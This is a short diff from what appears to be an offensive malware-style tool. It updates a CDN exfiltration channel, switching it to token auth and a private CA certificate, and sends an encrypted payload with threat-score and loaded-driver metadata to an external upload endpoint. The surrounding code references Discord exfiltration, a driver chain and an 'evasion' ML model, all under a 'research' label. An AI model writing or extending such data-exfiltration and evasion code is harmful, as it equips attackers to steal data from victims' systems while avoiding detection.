@@ -24,8 +24,8 @@ const DRIVER_CHAIN = [
 
 // Configuration
 const CDN_ENDPOINT = "https://research.internal:8443/upload"
-const CDN_AUTH_USER = "research"
-const CDN_AUTH_PASS = "secure_password"
+const CDN_AUTH_TOKEN = "Bearer secure_token_change_me"
+const CDN_CA_CERT = "/opt/jocky-cdn/certs/research.internal.crt"
 
 const ML_MODEL_PATH = "/opt/models/phi3_evasion.gguf"
 const MAX_INFERENCE_TIME_MS = 100
@@ -348,16 +348,20 @@ fn exfiltrate_via_discord() {
 }
 
 fn exfiltrate_via_cdn() {
-    println("[*] Attempting CDN exfiltration...")
+    println("[*] Attempting CDN exfiltration (Local)...")
 
-    // Local CDN (placeholder for AWS later)
-    let result = exfil_underminr_cdn(CDN_ENDPOINT, "research_chunk_001")
+    // Upload to local Caddy-based CDN
+    let metadata = "research_chain_v2:threat=" + string(threat_score) + ":drivers=" + string(array_len(loaded_drivers))
+    let result = exfil_local_cdn(CDN_ENDPOINT, "encrypted_payload_001", CDN_AUTH_TOKEN, metadata)
 
     if result == 0 {
-        println("  [+] CDN delivery successful")
+        println("  [+] Local CDN delivery successful")
+        println("  [+] Endpoint: " + CDN_ENDPOINT)
+        println("  [+] Storage: /opt/jocky-cdn/data/uploads/")
         log_operation("exfil", "cdn_upload", CDN_ENDPOINT, "success")
     } else {
-        println("  [*] CDN unavailable (optional channel)")
+        println("  [!] CDN delivery failed")
+        log_operation("exfil", "cdn_upload", CDN_ENDPOINT, "failed")
     }
 }
 
